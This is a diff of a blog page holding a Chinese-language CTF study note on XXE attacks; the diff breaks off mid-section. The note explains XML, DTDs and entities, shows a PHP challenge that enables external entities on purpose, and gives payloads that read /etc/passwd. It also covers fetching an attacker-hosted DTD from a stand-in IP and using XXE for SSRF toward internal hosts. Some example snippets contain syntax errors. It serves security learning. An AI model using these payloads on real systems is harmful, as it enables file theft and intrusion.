@@ -1,49 +1,49 @@
 <!doctype html>
 <html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
   data-bs-theme="auto" data-palette="blue">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><script src="/assets/init/bundle.min.e2303ecedf4a0b4053349a6f6f175a0abb5da5373ba37c14cd589b22ff2b2288.js" integrity="sha256-4jA&#43;zt9KC0BTNJpvbxdaCrtdpTc7o3wUzVibIv8rIog=" crossorigin="anonymous"></script>
+  <head><script src="/assets/init/bundle.min.acf86bec8f1585feebb4a7bc424e2c509abd0c84c974075fb9eee923b2c62b39.js" integrity="sha256-rPhr7I8Vhf7rtKe8Qk4sUJq9DITJdAdfue7pI7LGKzk=" crossorigin="anonymous"></script>
 <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>XXE漏洞利用 - xiaochai_123的小窝</title>
-    <link rel="icon" href="http://localhost:1313/images/icons/icon-16x16.png?version=10de02cdc53ad46a103b64b869070266" sizes="16x16">
-    <link rel="icon" href="http://localhost:1313/images/icons/icon-32x32.png?version=f1747f8c31b6821777c3a0956b5ba0db" sizes="32x32">
+    <link rel="icon" href="https://xiaochai-123.github.io/images/icons/icon-16x16.png?version=10de02cdc53ad46a103b64b869070266" sizes="16x16">
+    <link rel="icon" href="https://xiaochai-123.github.io/images/icons/icon-32x32.png?version=f1747f8c31b6821777c3a0956b5ba0db" sizes="32x32">
     <link rel="icon" href="/favicon_hu_1fce3f16494f6ae3.png" sizes="150x150" type="image/png">
     <link rel="apple-touch-icon" href="/favicon_hu_f105fae78c239d0f.png" sizes="180x180" type="image/png">
     <link rel="icon" href="/favicon_hu_af357fe99fc0195a.png" sizes="192x192" type="image/png">
-<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1"><link rel="icon" href="http://localhost:1313/images/icons/favicon.ico?version=13a0b7f517ed6605fd5fc54b37b8552d">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1"><link rel="icon" href="https://xiaochai-123.github.io/images/icons/favicon.ico?version=13a0b7f517ed6605fd5fc54b37b8552d">
 <meta name="keywords" content="" />
   <meta name="description" content="XXE漏洞利用学习笔记" />
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="http://localhost:1313/images/xxe.png">
+  <meta name="twitter:image" content="https://xiaochai-123.github.io/images/xxe.png">
   <meta name="twitter:title" content="XXE漏洞利用">
   <meta name="twitter:description" content="XXE漏洞利用学习笔记">
-<meta property="og:url" content="http://localhost:1313/posts/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+<meta property="og:url" content="https://xiaochai-123.github.io/posts/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
   <meta property="og:site_name" content="xiaochai_123的小窝">
   <meta property="og:title" content="XXE漏洞利用">
   <meta property="og:description" content="XXE漏洞利用学习笔记">
   <meta property="og:locale" content="zh_cn">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-12-27T16:35:35+08:00">
-    <meta property="article:modified_time" content="2025-12-27T16:35:35+08:00">
+    <meta property="article:published_time" content="2026-02-17T23:35:35+08:00">
+    <meta property="article:modified_time" content="2026-02-17T23:35:35+08:00">
     <meta property="article:tag" content="CTF">
     <meta property="article:tag" content="Web">
     <meta property="article:tag" content="XXE">
-    <meta property="og:image" content="http://localhost:1313/images/xxe.png">
+    <meta property="og:image" content="https://xiaochai-123.github.io/images/xxe.png">
 
   <meta itemprop="name" content="XXE漏洞利用">
   <meta itemprop="description" content="XXE漏洞利用学习笔记">
-  <meta itemprop="datePublished" content="2025-12-27T16:35:35+08:00">
-  <meta itemprop="dateModified" content="2025-12-27T16:35:35+08:00">
-  <meta itemprop="wordCount" content="14">
-  <meta itemprop="image" content="http://localhost:1313/images/xxe.png">
+  <meta itemprop="datePublished" content="2026-02-17T23:35:35+08:00">
+  <meta itemprop="dateModified" content="2026-02-17T23:35:35+08:00">
+  <meta itemprop="wordCount" content="701">
+  <meta itemprop="image" content="https://xiaochai-123.github.io/images/xxe.png">
   <meta itemprop="keywords" content="CTF,Web,XXE">
   <meta property="og:image:alt" content="XXE漏洞利用" />
   <meta name="twitter:image:alt" content="XXE漏洞利用" />
 
-<link data-precache rel="stylesheet" href="/assets/main/bundle.min.d5aac6480a1ef020e43c97debab51daf2d7322416eaa854051c3e1c6ef2b77df.css" integrity="sha256-1arGSAoe8CDkPJfeurUdry1zIkFuqoVAUcPhxu8rd98=" crossorigin="anonymous">
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.5e43b1a2119e65d96e086e7147d978bfdbb1033637f8262ecddbd3fbaee298c1.css" integrity="sha256-XkOxohGeZdluCG5xR9l4v9uxAzY3+CYuzdvT+67imME=" crossorigin="anonymous">
 
-    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.5778ec8e95e9d1e612441ebcf911ccb843e5cc5d9a1fc99ec90a32adbfebb3b4.css" integrity="sha256-V3jsjpXp0eYSRB68&#43;RHMuEPlzF2aH8meyQoyrb/rs7Q=" crossorigin="anonymous">
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
 
 
 
@@ -69,8 +69,8 @@
 <nav class="top-app-bar shadow navbar navbar-expand-lg">
   <div class="container">
 <a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
-    href="http://localhost:1313/">
-    <picture><img class="logo " alt="Logo" src="http://localhost:1313/images/logo.png?v=166cbf8ee66ab6626f3f85db1fb49313" loading="lazy" width="2048" height="2048" />
+    href="https://xiaochai-123.github.io/">
+    <picture><img class="logo " alt="Logo" src="https://xiaochai-123.github.io/images/logo.png?v=166cbf8ee66ab6626f3f85db1fb49313" loading="lazy" width="2048" height="2048" />
 </picture>
 xiaochai_123的小窝
 </a>
@@ -83,16 +83,16 @@ xiaochai_123的小窝
       <div class="offcanvas-body p-4 pt-0 p-lg-0">
         <hr class="d-lg-none">
         <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-lg-auto">
-            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/posts/">Posts
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/posts/">Posts
             </a>
           </li><li class="nav-item col-6 col-lg-auto">
-            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/categories/">Categories
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/categories/">Categories
             </a>
           </li><li class="nav-item col-6 col-lg-auto">
-            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/tags/">Tags
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/tags/">Tags
             </a>
           </li><li class="nav-item col-6 col-lg-auto">
-            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/friends/">Friends
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/friends/">Friends
             </a>
           </li>
         </ul>
@@ -221,7 +221,7 @@ xiaochai_123的小窝
 
 </header>
 
-    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.a9427f53469a98d1f41056ab9e1e085a005990992fc0f97bbf459f35ed9d1d43.js" integrity="sha256-qUJ/U0aamNH0EFarnh4IWgBZkJkvwPl7v0WfNe2dHUM=" crossorigin="anonymous"></script>
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.6a1fd2a99f6ad87b4aa9b7ed0f10344d4273d92cc29a6fb2cf05c463ec57ce39.js" integrity="sha256-ah/SqZ9q2HtKqbftDxA0TUJz2SzCmm&#43;yzwXEY&#43;xXzjk=" crossorigin="anonymous"></script>
 
       <div class="row content"><noscript>
     <div class="alert alert-danger" role="alert">Your browser does not support JavaScript.</div>
@@ -240,6 +240,12 @@ xiaochai_123的小窝
     
     
     
+  <a class="action action-toc d-none d-xxl-block" href="#postTOC" role="button" title="Contents">
+    <i class="fas fa-fw fa-list-alt"></i>
+  </a>
+<a class="action action-toc d-block d-xxl-none" href="#post-toc-container" role="button" title="Contents">
+  <i class="fas fa-fw fa-list-alt"></i>
+</a>
 
     <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="Comments">
   <i class="fas fa-fw fa-comments"></i>
@@ -256,11 +262,17 @@ xiaochai_123的小窝
     <h1 class="card-title post-title my-2">XXE漏洞利用</h1>
   </div>
   <div class="card-body"><div class="post-meta mb-3">
-  <span class="post-date me-1 mb-1" title="created on 2025-12-27 16:35:35 &#43;0800 CST.">December 27, 2025</span><span class="post-reading-time me-1 mb-1">1 min read</span><a href="/categories/ctf%E7%AC%94%E8%AE%B0/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+  <span class="post-date me-1 mb-1" title="created on 2026-02-17 23:35:35 &#43;0800 CST.">February 17, 2026</span><span class="post-reading-time me-1 mb-1">4 min read</span><a href="/categories/ctf%E7%AC%94%E8%AE%B0/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
       <i class="fas fa-fw fa-folder me-1"></i>CTF笔记</a><a href="/tags/ctf/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">CTF</a><a href="/tags/web/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Web</a><a href="/tags/xxe/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">XXE</a>
 </div>
 
-      <p class="lead mb-3 text-body-emphasis">XXE漏洞利用学习笔记</p><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
+      <p class="lead mb-3 text-body-emphasis">XXE漏洞利用学习笔记</p>
+<div class="mt-2 mb-3 d-block d-xxl-none">
+    <h2 class="text-surface mb-3">Contents</h2>
+    <div id="post-toc-container">
+        </div>
+    <hr class="text-secondary">
+</div><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
         <div id="post-content-body">
 <h1 id="xxe漏洞利用" data-numberify>XXE漏洞利用<a class="anchor ms-1" href="#xxe漏洞利用"></a></h1>
 <p>学习XXE首先了解XML语言：</p>
@@ -292,6 +304,384 @@ xiaochai_123的小窝
       </tr>
   </tbody>
 </table>
+<p>我们的xml标签是没有意义的，也就是说你可以随意命名。</p>
+<p>既然我们的标签没有意义，那么我们的注入怎么来呢？</p>
+<p>就是通过外部DTD声明。</p>
+
+<h2 id="dtd-doucument-type-definition" data-numberify>DTD (Doucument Type Definition)<a class="anchor ms-1" href="#dtd-doucument-type-definition"></a></h2>
+<p>文档类型定义，可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。在XML中DTD就是来定义我们自定义元素的相关属性的文档，它规定、约束XML规则的定义和陈述，DTD可被成行地声明于XML文档中，也可作为一个外部引用。</p>
+<p>XML文档内部定义的是内定义，例如：</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+&lt;!DOCTYPE root [
+                               &lt;!-- DOCTYPE用来约束XML规则 --&gt; 
+    &lt;!ELEMENT root (man)&gt;      &lt;!-- !ELEMENT定义root下有一个分支叫做man --&gt;
+    &lt;!ELEMENT man (name,age)&gt;  &lt;!-- 定义man根下有两个分支叫做name和age --&gt;
+    &lt;!ELEMENT name (#PCDATA)&gt;  &lt;!-- #PCDATA意味着name里面只能是字符串 --&gt;
+]&gt;
+&lt;root&gt;
+	&lt;man&gt;
+    	&lt;name&gt;leyi&lt;/name&gt;
+        &lt;age&gt;18&lt;/age&gt;
+        &lt;extra&gt;114514&lt;/extra&gt;  &lt;!-- 多余的会报错，但页面仍可正常打开 --&gt;
+    &lt;/man&gt;
+	&lt;man&gt;
+    	&lt;name&gt;晓堃&lt;/name&gt;
+        &lt;age&gt;18&lt;/age&gt;
+    &lt;/man&gt;
+&lt;/root&gt;
+</code></pre><p>除了<code>!ELEMENT</code>,我们还有其他的DTD声明标记，比如:</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!DOCTYPE root [
+    &lt;!ELEMENT ... &gt;      &lt;!-- 元素声明,定义元素 --&gt;
+    &lt;!ATTLIST ... &gt;      &lt;!-- 属性声明,定义元素的属性 --&gt;
+    &lt;!ENTITY ... &gt;       &lt;!-- 实体声明,定义实体,可被XML文档引用(常用) --&gt;
+    &lt;!NOTATION ... &gt;     &lt;!-- 符号声明,定义不被解释为元素或属性的符号 --&gt;
+]&gt;
+</code></pre><p>除了内部引用呢，我们还可以写一个DTD文件进行外部引用。例如:</p>
+<p>XML文件:</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+&lt;!DOCTYPE root SYSTEM &#34;1.dtd&#34;&gt;
+&lt;root&gt;
+	&lt;man&gt;
+    	&lt;name&gt;leyi&lt;/name&gt;
+        &lt;age&gt;18&lt;/age&gt;
+		&lt;extra&gt;114514&lt;/extra&gt;
+    &lt;/man&gt;
+	&lt;man&gt;
+    	&lt;name&gt;晓堃&lt;/name&gt;
+        &lt;age&gt;18&lt;/age&gt;
+    &lt;/man&gt;
+&lt;/root&gt;
+</code></pre><p>1.dtd文件:</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ELEMENT root (man)&gt;
+&lt;!ELEMENT man (name,age)&gt;
+&lt;!ELEMENT name (#PCDATA)&gt;
+</code></pre><p>SYSTEM读取1.dtd文件DTD声明，当然也可以读取其他的外部文件，比如flag , etc/passwd等。这就存在一个任意读取漏洞，既然可以读取，那么我们怎么把读取到的文件展示出来呢？且看漏洞原理</p>
+
+<h2 id="xml实体" data-numberify>XML实体<a class="anchor ms-1" href="#xml实体"></a></h2>
+<p>实体是什么呢？实体就是对数据的引用；根据实体种类的不同，XML解析器会将使用实体的替代文本或者外部文档的内容来替代实体引用。</p>
+<blockquote>
+<p>陈腾老师：就比如说“菊花”这个词，如果我们在花艺课上讲菊花，那你就会认为是菊花，一种花。”采菊东篱下，悠然见南山”的那个菊花。如果是在一个没有约束的情况下，两个小伙子之间脱口而出一个菊花，哦哟，那这个就意义深刻了。</p>
+</blockquote>
+<p>实体分类表</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">实体类型</th>
+          <th style="text-align: center">语法格式</th>
+          <th style="text-align: left">引用方式</th>
+          <th style="text-align: left">主要用途</th>
+          <th style="text-align: left">示例</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center"><strong>预定义实体</strong></td>
+          <td style="text-align: center">内置定义</td>
+          <td style="text-align: left"><code>&lt;</code> <code>&gt;</code></td>
+          <td style="text-align: left">转义XML保留字符</td>
+          <td style="text-align: left"><code>&amp;lt;</code> 代表 <code>&lt;</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"><strong>字符实体</strong></td>
+          <td style="text-align: center">Unicode编码</td>
+          <td style="text-align: left"><code>A</code> <code>A</code></td>
+          <td style="text-align: left">表示特殊字符</td>
+          <td style="text-align: left"><code>&amp;#169;</code> 代表 ©</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"><strong>内部实体</strong></td>
+          <td style="text-align: center"><code>&lt;!ENTITY 名 &quot;值&quot;&gt;</code></td>
+          <td style="text-align: left"><code>&amp;实体名;</code></td>
+          <td style="text-align: left">定义文本片段</td>
+          <td style="text-align: left"><code>&lt;!ENTITY author &quot;张三&quot;&gt;</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"><strong>外部实体</strong></td>
+          <td style="text-align: center"><code>&lt;!ENTITY 名 SYSTEM &quot;URI&quot;&gt;</code></td>
+          <td style="text-align: left"><code>&amp;实体名;</code></td>
+          <td style="text-align: left">引用外部文件内容</td>
+          <td style="text-align: left"><code>&lt;!ENTITY logo SYSTEM &quot;logo.txt&quot;&gt;</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"><strong>参数实体</strong></td>
+          <td style="text-align: center"><code>&lt;!ENTITY % 名 &quot;值&quot;&gt;</code></td>
+          <td style="text-align: left"><code>%实体名;</code></td>
+          <td style="text-align: left">DTD内部代码复用</td>
+          <td style="text-align: left"><code>&lt;!ENTITY % common &quot;name,age&quot;&gt;</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"><strong>命名实体</strong></td>
+          <td style="text-align: center">无固定语法格式（自然语言）</td>
+          <td style="text-align: left">直接出现在文本中</td>
+          <td style="text-align: left">标识专有名词</td>
+          <td style="text-align: left">&ldquo;张三&rdquo;（人名）、&ldquo;北京&rdquo;（地名）</td>
+      </tr>
+  </tbody>
+</table>
+
+<h3 id="预定义实体" data-numberify>预定义实体<a class="anchor ms-1" href="#预定义实体"></a></h3>
+<p>例如<code>&amp;lt;代表&lt;</code>,<code>&amp;gt;代表&gt;</code>,<code>&amp;amp代表&amp;</code>,<code>&amp;apos;代表'</code>,<code>&amp;quot代表&quot;</code></p>
+
+<h3 id="命名实体" data-numberify>命名实体<a class="anchor ms-1" href="#命名实体"></a></h3>
+<p>类似变量，比如:</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+&lt;!DOCTYPE author [
+		&lt;!ELEMENT author (#PCDATA)&gt;
+		&lt;!ELEMENT writer &#34;Triode&#34;&gt;
+		&lt;!ELEMENT copyright &#34;&amp;#169&#34;;&gt;
+		]&gt;
+&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;
+</code></pre><p>这里面的<code>&amp;writer;</code>就会被实际渲染为<code>Triode</code></p>
+<p>如果一个网站能够解析我们的XML，那么我们就可以读取目标内容赋值到一个实体上，然后给我们展示出来。这样我们就达成了一个最基础的漏洞逻辑。</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+&lt;!DOCTYPE author [
+		&lt;!ELEMENT author (#PCDATA)&gt;
+		&lt;!ELEMENT writer &#34;Triode&#34;&gt;
+		&lt;!ELEMENT copyright &#34;&amp;writer;&amp;#169&#34;;&gt;
+		]&gt;
+&lt;author&gt;&amp;copyright;&lt;/author&gt;
+</code></pre><p>实体可以迭代调用，这段语句实际渲染出来的效果和上面是一样的。</p>
+
+<h3 id="参数实体" data-numberify>参数实体<a class="anchor ms-1" href="#参数实体"></a></h3>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+&lt;!DOCTYPE author [
+		&lt;!ELEMENT residence (name, street, pincode, city, phone)&gt;
+		&lt;!ELEMENT apartment (name, street, pincode, city, phone)&gt;
+		&lt;!ELEMENT office (name, street, pincode, city, phone)&gt;
+        &lt;!ELEMENT shop (name, street, pincode, city, phone)&gt;
+		]&gt;
+&lt;author&gt;
+	&lt;residence&gt;&lt;name&gt;&lt;/name&gt;...&lt;/residence&gt;
+&lt;/author&gt;
+</code></pre><p>我们通过参数实体就可以把上面的语段简化为</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+&lt;!DOCTYPE author [
+        &lt;!ENTITY % area &#34;name, street, pincode, city&#34;》
+		&lt;!ELEMENT residence (%area;)&gt;
+		&lt;!ELEMENT apartment (%area;)&gt;
+		&lt;!ELEMENT office (%area;)&gt;
+        &lt;!ELEMENT shop (%area;)&gt;
+		]&gt;
+&lt;author&gt;
+	&lt;residence&gt;&lt;name&gt;&lt;/name&gt;...&lt;/residence&gt;
+&lt;/author&gt;
+</code></pre>
+<h2 id="xxe漏洞" data-numberify>XXE漏洞<a class="anchor ms-1" href="#xxe漏洞"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libxml_disable_entity_loader</span>(<span style="color:#66d9ef">false</span>); <span style="color:#75715e">// 允许加载外部实体（开启XXE漏洞😈）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$xml <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;php://input&#39;</span>); <span style="color:#75715e">//调用php伪协议，读取POST请求的原始数据（XML格式）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($xml)){
+</span></span><span style="display:flex;"><span>	$dom <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DOMDocument</span>(); <span style="color:#75715e">//DOMdocument()函数读取解析xml文件结构
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	$dom<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">loadXML</span>($xml,<span style="color:#a6e22e">LIBXML_NOENT</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">LIBXML_DTDLOAD</span>); <span style="color:#75715e">//加载XML，启用实体解析和DTD加载
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	$creds <span style="color:#f92672">=</span> <span style="color:#a6e22e">simplexml_import_dom</span>($dom);  <span style="color:#75715e">//将DOM对象转换为SimpleXML对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	$benben <span style="color:#f92672">=</span> $creds<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">admin</span>; <span style="color:#75715e">//获取XML中的&lt;admin&gt;元素的值
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">echo</span> $benben; <span style="color:#75715e">//输出admin元素的内容
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>比如这道题目的源码。在burpsuite里面把<code>Content-Type</code>改成<code>application/xml;charset=utf-8</code></p>
+<p>通过POST方式传入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;&lt;admin&gt;</span>114514<span style="color:#f92672">&lt;/admin&gt;&lt;/root&gt;</span>
+</span></span></code></pre></div><p>在页面上就会显示出114514，代码调用了<code>&lt;admin&gt;</code>节点</p>
+<p>那么我们通过POST方式传入</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!DOCTYPE root [&lt;!ENTITY KFC SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;
+&lt;McDonalds&gt;&lt;admin&gt;&amp;KFC;&lt;/admin&gt;&lt;/McDonalds&gt;
+</code></pre><p>就可以成功读取到ect/passwd里面的内容！</p>
+<p>不同语言调用不一样的伪协议</p>
+<table>
+  <thead>
+      <tr>
+          <th>LIBXML2</th>
+          <th>PHP</th>
+          <th>JAVA</th>
+          <th>.NET</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>file</td>
+          <td>file</td>
+          <td>file</td>
+          <td>file</td>
+      </tr>
+      <tr>
+          <td>http</td>
+          <td>http</td>
+          <td>http</td>
+          <td>http</td>
+      </tr>
+      <tr>
+          <td>ftp</td>
+          <td>ftp</td>
+          <td>https</td>
+          <td>https</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td>php</td>
+          <td>ftp</td>
+          <td>ftp</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td>compress.Zlib</td>
+          <td>jar</td>
+          <td>ftps</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td>compress.bzip2</td>
+          <td>netdoc</td>
+          <td>smb</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td>data</td>
+          <td>mailto</td>
+          <td>zip</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td>glob</td>
+          <td>gopher*</td>
+          <td>rar</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td>phar</td>
+          <td>zip</td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+
+<h3 id="有回显的xxe漏洞" data-numberify>有回显的XXE漏洞<a class="anchor ms-1" href="#有回显的xxe漏洞"></a></h3>
+<p>我们可以通过 <strong>查看源代码</strong>、<strong>BP抓数据包</strong>、<strong>修改Content-Type</strong>、<strong>POC测试</strong> 等方法来发现XXE漏洞。</p>
+<p>比如在一个<strong>有回显用户名</strong>的登录界面，我们传入这个</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!DOCTYPE root [&lt;!ENTITY KFC SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;
+</code></pre><p>然后把回显位(用户名)换成 <code>&amp;KFC;</code> 就能回显信息。不难理解</p>
+
+<h3 id="利用参数实体及外部实体读取文件" data-numberify>利用参数实体及外部实体读取文件<a class="anchor ms-1" href="#利用参数实体及外部实体读取文件"></a></h3>
+<p>参数实体只有在dtd内部才能被调用。当file伪协议被waf时，假设我们有三台机器，我们可以这样操作。</p>
+<p>这三台主机是attacker，kali，XXE靶机。</p>
+<p>既然我们不能直接使用file伪协议，那么我们就用http伪协议，让服务器去我们的kali服务器上读取dtd文件。</p>
+<p>这样，本质上我们把原来的<code>&lt;!DOCTYPE root [&lt;!ENTITY KFC SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</code>拆成了两部分</p>
+<p>attacker端向XXE靶机发送<code>&lt;!DOCTYPE root [&lt;!ENTITY % KFC SYSTEM &quot;http://x.x.x.x/1.dtd&quot;&gt; %KFC; ]&gt;</code>当然这里面是不存在file的，所以不会被waf拦截。我们通过SYSTEM让靶机去下载我们kali上写好的dtd:<code>&lt;!ENTITY mcd SYSTEM &quot;file:///etc/passwd&quot; &gt;</code>，从而让靶机把目标内容写在命名实体<code>&amp;mcd;</code>里面</p>
+<p>附：在kali上开放服务的方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /tmp  //转到/tmp目录
+</span></span><span style="display:flex;"><span>vim 1.dtd //通过vim编辑我们的1.dtd
+</span></span><span style="display:flex;"><span>&lt;!ENTITY ben SYSTEM <span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span> //写入内容，:wq保存并退出
+</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span> //开放80端口
+</span></span><span style="display:flex;"><span>ip add //查询ip<span style="color:#f92672">(</span>当然我们需要一个公网ip<span style="color:#f92672">)</span>
+</span></span></code></pre></div>
+<h3 id="利用xxe进行ssrf利用" data-numberify>利用XXE进行SSRF利用<a class="anchor ms-1" href="#利用xxe进行ssrf利用"></a></h3>
+<p>既然我们可以利用http伪协议，那么我们可以通过这个XXE靶机作为一个跳板机来发起请求。</p>
+<p>比如在某些情况下，我们因为防火墙或内网原因，无法访问目标主机，那么我们可以通过XXE来劫持一个机器A来访问我们的目标主机。如图</p>
+<p><picture><img class="img-fluid " alt="ssrf" src="https://xiaochai-123.github.io/images/screenshoots/2026-02/image-20260217195609171.png?v=8fc843844ef391f8235dfc2b184d0460" loading="lazy" width="919" height="469" />
+</picture>
+
+</p>
+<p>A和B在一个局域网里。同样的，我们在请求体里写入：(假设B的内网ip地址是10.1.2.5)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">root</span> <span style="color:#66d9ef">[&lt;!ENTITY</span> KFC <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;http://10.1.2.3&#34;</span>]
+</span></span></code></pre></div><p>理想情况下，应答体里面会回复：<code>请输入要执行的命令，例如：http://ip/?cmd=ls</code> 我们就可以愉快地RCE了</p>
+
+<h3 id="利用php伪协议读取文件" data-numberify>利用PHP伪协议读取文件<a class="anchor ms-1" href="#利用php伪协议读取文件"></a></h3>
+<p>相较于file伪协议，PHP伪协议可以对读取出的文件进行数据编码。(也就是说会读取到源代码)</p>
+<p>使用PHP伪协议，对目标数据进行base64编码来读取是惯用手法（）</p>
+<p>我们利用SSRF漏洞，使用http伪协议的cat命令来读取源代码是行不通的，因为页面会被解析导致看不到</p>
+<p>那我们就得用</p>
